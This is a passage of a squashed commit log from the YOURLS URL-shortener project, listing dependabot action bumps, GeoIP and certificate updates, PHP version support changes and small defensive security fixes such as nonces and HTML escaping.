- [Commits]([peter-evans/create-pull-request@v3.9.2...v3.10.0](https://github.com/peter-evans/create-pull-request/compare/v3.9.2...v3.10.0))

Signed-off-by: dependabot[bot] <support@github.com>

* Filter all HTTP request params ([YOURLS#2951](https://github.com/YOURLS/YOURLS/pull/2951))

* Add `version` to API usage

Closes [YOURLS#2957](https://github.com/YOURLS/YOURLS/issues/2957)

[skip ci]

* Bump peaceiris/actions-label-commenter from 1.9.1 to 1.9.2 ([YOURLS#2980](https://github.com/YOURLS/YOURLS/pull/2980))

Bumps [peaceiris/actions-label-commenter](<https://github.com/peaceiris/actions-label-commenter>) from 1.9.1 to 1.9.2.
- [Release notes](<https://github.com/peaceiris/actions-label-commenter/releases>)
- [Changelog](<https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md>)
- [Commits]([peaceiris/actions-label-commenter@v1.9.1...v1.9.2](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.1...v1.9.2))

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peaceiris/actions-label-commenter from 1.9.2 to 1.10.0

Bumps [peaceiris/actions-label-commenter](<https://github.com/peaceiris/actions-label-commenter>) from 1.9.2 to 1.10.0.
- [Release notes](<https://github.com/peaceiris/actions-label-commenter/releases>)
- [Changelog](<https://github.com/peaceiris/actions-label-commenter/blob/main/CHANGELOG.md>)
- [Commits]([peaceiris/actions-label-commenter@v1.9.2...v1.10.0](https://github.com/peaceiris/actions-label-commenter/compare/v1.9.2...v1.10.0))

---
updated-dependencies:
- dependency-name: peaceiris/actions-label-commenter
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.11.0 to 2.12.0 ([YOURLS#2996](https://github.com/YOURLS/YOURLS/pull/2996))

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.11.0 to 2.12.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.11.0...2.12.0](https://github.com/shivammathur/setup-php/compare/2.11.0...2.12.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.12.0 to 2.13.0 ([YOURLS#3032](https://github.com/YOURLS/YOURLS/pull/3032))

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.12.0 to 2.13.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.12.0...2.13.0](https://github.com/shivammathur/setup-php/compare/2.12.0...2.13.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Bump peter-evans/create-pull-request from 3.10.0 to 3.10.1 ([YOURLS#3029](https://github.com/YOURLS/YOURLS/pull/3029))

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.10.0 to 3.10.1.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3.10.0...v3.10.1](https://github.com/peter-evans/create-pull-request/compare/v3.10.0...v3.10.1))

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

Co-authored-by: dependabot[bot] <49699333+dependabot[bot]@users.noreply.github.com>

* Minor security improvements ([YOURLS#3034](https://github.com/YOURLS/YOURLS/pull/3034))

* Prevent iframe jacking
* Enforce nonce on admin login screen

* Bump version and update changelog

[skip ci]

* Update auth tests to match [YOURLS#3034](https://github.com/YOURLS/YOURLS/pull/3034) ([YOURLS#3035](https://github.com/YOURLS/YOURLS/pull/3035))

* Minor security improvements [#2](https://github.com/iWantToKeepAnon/YOURLS/pull/2) ([YOURLS#3041](https://github.com/YOURLS/YOURLS/pull/3041))

* Escape HTML and attributes before returning
* Remove deprecated vars

* Prevent encryption warning when password provided via env ([YOURLS#3040](https://github.com/YOURLS/YOURLS/pull/3040))

Fixes [YOURLS#3038](https://github.com/YOURLS/YOURLS/issues/3038)

* added check for user provided from environment variables
* Add unit tests

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Support HTTPS termination on a reverse proxy ([YOURLS#3044](https://github.com/YOURLS/YOURLS/pull/3044))

When HTTPS termination happens on a reverse proxy, $_SERVER['HTTPS'] is not set and $_SERVER['SERVER_PORT'] is 80.
The current implementation tries to redirect infinitely in this situation because the function yourls_is_ssl() is false, although the actual URL begins with https://.

* Filterable user defined constants, and more tests ([YOURLS#3048](https://github.com/YOURLS/YOURLS/pull/3048))

* Test referrer parsing

* Update CHANGELOG.md

* Post release bump. Onto the next version!

[skip ci]

* Use PAT in workflow to allow chaining

* Sanitize user input in upgrade ([YOURLS#3055](https://github.com/YOURLS/YOURLS/pull/3055))

* Bump shivammathur/setup-php from 2.13.0 to 2.14.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.13.0 to 2.14.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.13.0...2.14.0](https://github.com/shivammathur/setup-php/compare/2.13.0...2.14.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove labeler as per template enforcement

* Enable auto-merge for dependabot

* Enable auto-merge for dependabot

* Bump shivammathur/setup-php from 2.14.0 to 2.15.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.14.0 to 2.15.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.14.0...2.15.0](https://github.com/shivammathur/setup-php/compare/2.14.0...2.15.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.3.4 to 2.3.5

Bumps [actions/checkout](<https://github.com/actions/checkout>) from 2.3.4 to 2.3.5.
- [Release notes](<https://github.com/actions/checkout/releases>)
- [Changelog](<https://github.com/actions/checkout/blob/main/CHANGELOG.md>)
- [Commits]([actions/checkout@v2.3.4...v2.3.5](https://github.com/actions/checkout/compare/v2.3.4...v2.3.5))

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Remove explicit matrix tag in workflow name

Let GitHub auto tag jobs and make them more generic

* Fix incorrect "prefix and shorten" notice while logged out

Fixes [YOURLS#2688](https://github.com/YOURLS/YOURLS/issues/2688)

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Automatic PR for Helm charts after a release

* Fix workflow file

[ci skip]

* Bump actions/checkout from 2.3.5 to 2.4.0

Bumps [actions/checkout](<https://github.com/actions/checkout>) from 2.3.5 to 2.4.0.
- [Release notes](<https://github.com/actions/checkout/releases>)
- [Changelog](<https://github.com/actions/checkout/blob/main/CHANGELOG.md>)
- [Commits]([actions/checkout@v2.3.5...v2.4.0](https://github.com/actions/checkout/compare/v2.3.5...v2.4.0))

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.10.1 to 3.11.0

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.10.1 to 3.11.0.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3.10.1...v3.11.0](https://github.com/peter-evans/create-pull-request/compare/v3.10.1...v3.11.0))

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.15.0 to 2.16.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.15.0 to 2.16.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.15.0...2.16.0](https://github.com/shivammathur/setup-php/compare/2.15.0...2.16.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump peter-evans/create-pull-request from 3.11.0 to 3.12.0

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.11.0 to 3.12.0.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3.11.0...v3.12.0](https://github.com/peter-evans/create-pull-request/compare/v3.11.0...v3.12.0))

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Revert 3090 & fix tests ([YOURLS#3188](https://github.com/YOURLS/YOURLS/pull/3188))

* Allow prefix n shortening without being logged in

Fixes [YOURLS#3189](https://github.com/YOURLS/YOURLS/issues/3189)

- Allow prefix n shortening without being logged in
- Test checking for redirection on successful auth

Props [@dan-r](https://github.com/dan-r) for the initial digging on this issue !

* Update GeoIP db ([YOURLS#3191](https://github.com/YOURLS/YOURLS/pull/3191))

* Update GeoIP2 db
* Update tests

Fixes [YOURLS#3173](https://github.com/YOURLS/YOURLS/issues/3173)

* Bump peter-evans/create-pull-request from 3.12.0 to 3.12.1

Bumps [peter-evans/create-pull-request](<https://github.com/peter-evans/create-pull-request>) from 3.12.0 to 3.12.1.
- [Release notes](<https://github.com/peter-evans/create-pull-request/releases>)
- [Commits]([peter-evans/create-pull-request@v3.12.0...v3.12.1](https://github.com/peter-evans/create-pull-request/compare/v3.12.0...v3.12.1))

---
updated-dependencies:
- dependency-name: peter-evans/create-pull-request
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.16.0 to 2.17.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.16.0 to 2.17.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.16.0...2.17.0](https://github.com/shivammathur/setup-php/compare/2.16.0...2.17.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Reuse org workflows

* Drop release workflows

The relative actions has been moved to downstream to simplify maintenance

* Updated default links from 'http' to 'https' ([YOURLS#3229](https://github.com/YOURLS/YOURLS/pull/3229))

* Updated default links from 'http' to 'https'
* Updated unit test

* Bump to php 8.1 and drop 7.2, 7.3 ([YOURLS#3230](https://github.com/YOURLS/YOURLS/pull/3230))

* Bump tests to php 8.1 and drop 7.2, 7.3
* Bump vendor version to align with new requirements
* Drop conflicted and deprecated YDB functions
* Use proper Request namespace
* Fix a deprecation warning

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update .gitattributes

* Clean up gitattributes

* Mark vendor files as generated

* Remove ozh/phpass and use on password_* functions ([YOURLS#3232](https://github.com/YOURLS/YOURLS/pull/3232))

Fixes [YOURLS#3231](https://github.com/YOURLS/YOURLS/issues/3231)

* Bump shivammathur/setup-php from 2.17.0 to 2.17.1

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.17.0 to 2.17.1.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.17.0...2.17.1](https://github.com/shivammathur/setup-php/compare/2.17.0...2.17.1))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump actions/checkout from 2.4.0 to 3

Bumps [actions/checkout](<https://github.com/actions/checkout>) from 2.4.0 to 3.
- [Release notes](<https://github.com/actions/checkout/releases>)
- [Changelog](<https://github.com/actions/checkout/blob/main/CHANGELOG.md>)
- [Commits]([actions/checkout@v2.4.0...v3](https://github.com/actions/checkout/compare/v2.4.0...v3))

---
updated-dependencies:
- dependency-name: actions/checkout
  dependency-type: direct:production
  update-type: version-update:semver-major
...

Signed-off-by: dependabot[bot] <support@github.com>

* Upload coverage only when coverage is enabled

ref [YOURLS#3238](https://github.com/YOURLS/YOURLS/issues/3238)

* Try and catch concurrency errors ([YOURLS#3233](https://github.com/YOURLS/YOURLS/pull/3233))

* Try and catch concurrency errors when creating new short urls, updating click count and logging redirects
* Code refactoring
* Couple more tests while at it

Fixes [YOURLS#2538](https://github.com/YOURLS/YOURLS/issues/2538)
Fixes [YOURLS#765](https://github.com/YOURLS/YOURLS/issues/765)
Fixes [YOURLS#1974](https://github.com/YOURLS/YOURLS/issues/1974)
Fixes [YOURLS#2829](https://github.com/YOURLS/YOURLS/issues/2829)

* Remove scrutinizer ([YOURLS#3245](https://github.com/YOURLS/YOURLS/pull/3245))

* Make element ID independent from the short URL ([YOURLS#3244](https://github.com/YOURLS/YOURLS/pull/3244))

Fixing a dumb idea introduced in version 0.1 :^P

Fixes [YOURLS#2925](https://github.com/YOURLS/YOURLS/issues/2925)

* Restore certificates ([YOURLS#3250](https://github.com/YOURLS/YOURLS/pull/3250))

* Restore certificates
* Make sure to test againts HTTPS so this won't happen again

* Explicitely exit after redirection where needed ([YOURLS#3257](https://github.com/YOURLS/YOURLS/pull/3257))

Fixes [YOURLS#3217](https://github.com/YOURLS/YOURLS/issues/3217)
Would fix [YOURLS#2688](https://github.com/YOURLS/YOURLS/issues/2688) if it weren't already fixed

* Bump shivammathur/setup-php from 2.17.1 to 2.18.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.17.1 to 2.18.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.17.1...2.18.0](https://github.com/shivammathur/setup-php/compare/2.17.1...2.18.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Add nonce to the logout link ([YOURLS#3264](https://github.com/YOURLS/YOURLS/pull/3264))

* Add nonce to the logout link
* Add tests for cookies being set or reset
* More tests: check nonces are different for different actions & users

Fixes [YOURLS#3170](https://github.com/YOURLS/YOURLS/issues/3170)

* More hooks for the admin view & search ([YOURLS#3265](https://github.com/YOURLS/YOURLS/pull/3265))

Will fix [YOURLS#3074](https://github.com/YOURLS/YOURLS/issues/3074) and [YOURLS#3262](https://github.com/YOURLS/YOURLS/issues/3262)

* Plugin API : sandbox and uninstall procedure ([YOURLS#3258](https://github.com/YOURLS/YOURLS/pull/3258))

- foolproof (?) activation sandbox that actually works
- uninstall method
- Plugin activation sandbox and unit tests
- Uninstall script and tests

* Update version checking and use /version/1.1/ ([YOURLS#3268](https://github.com/YOURLS/YOURLS/pull/3268))

* Fix typo

[skip ci]

* Do not use md5() in yourls_salt() ([YOURLS#3278](https://github.com/YOURLS/YOURLS/pull/3278))

* Do not use md5() in yourls_salt()
* More tests while we're here

Fixes [YOURLS#3277](https://github.com/YOURLS/YOURLS/issues/3277)

* Bump shivammathur/setup-php from 2.18.0 to 2.18.1

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.18.0 to 2.18.1.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.18.0...2.18.1](https://github.com/shivammathur/setup-php/compare/2.18.0...2.18.1))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* More plugin functions ([YOURLS#3281](https://github.com/YOURLS/YOURLS/pull/3281))

Introduce yourls_get_actions() and yourls_get_filters(), and their tests

* Update certificates ([YOURLS#3283](https://github.com/YOURLS/YOURLS/pull/3283))

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update certificates ([YOURLS#3282](https://github.com/YOURLS/YOURLS/pull/3282))

Workflow to update cacert every monday if a new bundle is published

* Update GeoIP DB ([YOURLS#3289](https://github.com/YOURLS/YOURLS/pull/3289))

Co-authored-by: ozh <ozh@ozh.org>

* Regularly update GeoIP db ([YOURLS#3284](https://github.com/YOURLS/YOURLS/pull/3284))

Regularly update GeoIP db
Workflow to update geoip db every monday if a new version is available

* More checks with new version notices ([YOURLS#3290](https://github.com/YOURLS/YOURLS/pull/3290))

* add unit tests to make sure running 1.8.3-dev will trigger a new version notice when 1.8.3 is out (I think it already works this way)
* more validation of the api core/update response

* Promote docs.yourls.org ([YOURLS#3291](https://github.com/YOURLS/YOURLS/pull/3291))

* Don't delete branch when closing `update-geoip` PR ([YOURLS#3294](https://github.com/YOURLS/YOURLS/pull/3294))

* Update GeoIP with Github App ([YOURLS#3298](https://github.com/YOURLS/YOURLS/pull/3298))

* Update GeoIP with Github App
Source: <https://github.com/peter-evans/create-pull-request/blob/main/docs/concepts-guidelines.md#authenticating-with-github-app-generated-tokens>

Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Update GeoIP DB ([YOURLS#3303](https://github.com/YOURLS/YOURLS/pull/3303))

Co-authored-by: ozh <ozh@ozh.org>

* More helpful "URL already exists" ([YOURLS#3305](https://github.com/YOURLS/YOURLS/pull/3305))

Fixes [YOURLS#1676](https://github.com/YOURLS/YOURLS/issues/1676) opened by... myself... 8 years ago ð

* 1.9 ([YOURLS#3304](https://github.com/YOURLS/YOURLS/pull/3304))

Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: LÃ©o Colombaro <git@colombaro.fr>

* Post release bump

* Bump dependencies and remove ([YOURLS#3309](https://github.com/YOURLS/YOURLS/pull/3309))

Updates :
- aura/sql (3.0.0 => 3.1.0)
- maxmind/web-service-common (v0.8.1 => v0.9.0)
- rmccue/requests (v2.0.1 => 2.0.2)
- symfony/polyfill-intl-idn (v1.24.0 => v1.25.0)
- symfony/polyfill-intl-normalizer (v1.24.0 => v1.25.0)
- symfony/polyfill-mbstring (v1.24.0 => v1.25.0)
- symfony/polyfill-php72 (v1.24.0 => v1.25.0)

* Fix checking for new certs ([YOURLS#3313](https://github.com/YOURLS/YOURLS/pull/3313))

Stop fighthing with the etags, just download the darn files

* Update GeoIP DB ([YOURLS#3315](https://github.com/YOURLS/YOURLS/pull/3315))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update certificates ([YOURLS#3316](https://github.com/YOURLS/YOURLS/pull/3316))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Remove warnings on PHP 8.1 ([YOURLS#3317](https://github.com/YOURLS/YOURLS/pull/3317))

Also, minor code styles doc & typo
* Refactor yourls_filter_unique_id() to remove useless vars
* Comply with phpstan level 4
* add some tests to cover newly discovered potential issues

* Add missing inline documentation ([YOURLS#3325](https://github.com/YOURLS/YOURLS/pull/3325))

* Inline documentation ([YOURLS#3329](https://github.com/YOURLS/YOURLS/pull/3329))

Now 100% complete

* Fix error `Undefined constant "intval"` when upgrading ([YOURLS#3332](https://github.com/YOURLS/YOURLS/pull/3332))

Closes [YOURLS#3331](https://github.com/YOURLS/YOURLS/issues/3331)

* Update GeoIP DB ([YOURLS#3334](https://github.com/YOURLS/YOURLS/pull/3334))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3340](https://github.com/YOURLS/YOURLS/pull/3340))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* List required/suggested PHP extensions in composer.json ([YOURLS#3339](https://github.com/YOURLS/YOURLS/pull/3339))

* List required/suggested PHP extensions in composer.json

Best-effort attempt to declare all extensions used by YOURLS.

Based on the output of <https://github.com/RogerGee/php-ext-depends>

`composer check-platform-reqs` will show the status of all except those
in "suggest", which is a limitation to sort out later.

* Update composer.json extension requirements after further research

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB ([YOURLS#3348](https://github.com/YOURLS/YOURLS/pull/3348))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* No hyphen in random keywords ([YOURLS#3353](https://github.com/YOURLS/YOURLS/pull/3353))

Fixes  [YOURLS#2281](https://github.com/YOURLS/YOURLS/issues/2281)
Fixes [YOURLS/random-keywords#8](https://github.com/YOURLS/random-keywords/issues/8)

* Always include `functions-(upgrade|install).php` ([YOURLS#3354](https://github.com/YOURLS/YOURLS/pull/3354))

Fixes [YOURLS#3326](https://github.com/YOURLS/YOURLS/issues/3326)

* Return 400 instead of 500 when duplicate ([YOURLS#3355](https://github.com/YOURLS/YOURLS/pull/3355))

Fixes [YOURLS#3319](https://github.com/YOURLS/YOURLS/issues/3319)

* Update GeoIP DB ([YOURLS#3356](https://github.com/YOURLS/YOURLS/pull/3356))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Release v1.9.1 ([YOURLS#3350](https://github.com/YOURLS/YOURLS/pull/3350))

* Version 1.9.1
Co-authored-by: dgw <dgw@technobabbl.es>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Post release bump

* Bump shivammathur/setup-php from 2.18.1 to 2.19.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.18.1 to 2.19.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.18.1...2.19.0](https://github.com/shivammathur/setup-php/compare/2.18.1...2.19.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.19.0 to 2.19.1

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.19.0 to 2.19.1.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.19.0...2.19.1](https://github.com/shivammathur/setup-php/compare/2.19.0...2.19.1))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB ([YOURLS#3362](https://github.com/YOURLS/YOURLS/pull/3362))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Fix geoip tests with a more confident ipv6 ([YOURLS#3369](https://github.com/YOURLS/YOURLS/pull/3369))

This one is in Japan according to all tools I could check

* Update GeoIP DB ([YOURLS#3368](https://github.com/YOURLS/YOURLS/pull/3368))

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB ([YOURLS#3370](https://github.com/YOURLS/YOURLS/pull/3370))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.19.1 to 2.20.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.19.1 to 2.20.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.19.1...2.20.0](https://github.com/shivammathur/setup-php/compare/2.19.1...2.20.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump shivammathur/setup-php from 2.20.0 to 2.20.1

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.20.0 to 2.20.1.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.20.0...2.20.1](https://github.com/shivammathur/setup-php/compare/2.20.0...2.20.1))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB ([YOURLS#3373](https://github.com/YOURLS/YOURLS/pull/3373))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.20.1 to 2.21.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.20.1 to 2.21.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.20.1...2.21.0](https://github.com/shivammathur/setup-php/compare/2.20.1...2.21.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB ([YOURLS#3385](https://github.com/YOURLS/YOURLS/pull/3385))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.0 to 2.21.1

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.21.0 to 2.21.1.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.21.0...2.21.1](https://github.com/shivammathur/setup-php/compare/2.21.0...2.21.1))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update certificates ([YOURLS#3389](https://github.com/YOURLS/YOURLS/pull/3389))

Co-authored-by: ozh <ozh@users.noreply.github.com>
Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Update GeoIP DB ([YOURLS#3397](https://github.com/YOURLS/YOURLS/pull/3397))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3405](https://github.com/YOURLS/YOURLS/pull/3405))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.21.1 to 2.21.2

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.21.1 to 2.21.2.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.21.1...2.21.2](https://github.com/shivammathur/setup-php/compare/2.21.1...2.21.2))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-patch
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB ([YOURLS#3417](https://github.com/YOURLS/YOURLS/pull/3417))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3419](https://github.com/YOURLS/YOURLS/pull/3419))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3424](https://github.com/YOURLS/YOURLS/pull/3424))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3432](https://github.com/YOURLS/YOURLS/pull/3432))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* When adding URLs, new HTML rows should have unique HTML IDs. ([YOURLS#3431](https://github.com/YOURLS/YOURLS/pull/3431))

* When adding URLs, new HTML rows should have unique HTML IDs.
* Fix newly added assertions in Format_General::test_string2htmlid()

Co-authored-by: à¾à¼» Ç¬ÉÄ§ à¼à¼à½ <ozh@ozh.org>

* Typofixes

* Update admin/index.php

Co-authored-by: dgw <dgw@technobabbl.es>

* Update GeoIP DB ([YOURLS#3436](https://github.com/YOURLS/YOURLS/pull/3436))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB

* Update certificates

* Bump shivammathur/setup-php from 2.21.2 to 2.22.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.21.2 to 2.22.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.21.2...2.22.0](https://github.com/shivammathur/setup-php/compare/2.21.2...2.22.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Update GeoIP DB ([YOURLS#3453](https://github.com/YOURLS/YOURLS/pull/3453))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Support PHP 8.2 ([YOURLS#3474](https://github.com/YOURLS/YOURLS/pull/3474))

* Update GeoIP DB

* Update GeoIP DB ([YOURLS#3477](https://github.com/YOURLS/YOURLS/pull/3477))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Update GeoIP DB ([YOURLS#3479](https://github.com/YOURLS/YOURLS/pull/3479))

Co-authored-by: ozh <ozh@users.noreply.github.com>

* Bump shivammathur/setup-php from 2.22.0 to 2.23.0

Bumps [shivammathur/setup-php](<https://github.com/shivammathur/setup-php>) from 2.22.0 to 2.23.0.
- [Release notes](<https://github.com/shivammathur/setup-php/releases>)
- [Commits]([shivammathur/setup-php@2.22.0...2.23.0](https://github.com/shivammathur/setup-php/compare/2.22.0...2.23.0))

---
updated-dependencies:
- dependency-name: shivammathur/setup-php
  dependency-type: direct:production
  update-type: version-update:semver-minor
...

Signed-off-by: dependabot[bot] <support@github.com>

* Bump dependencies

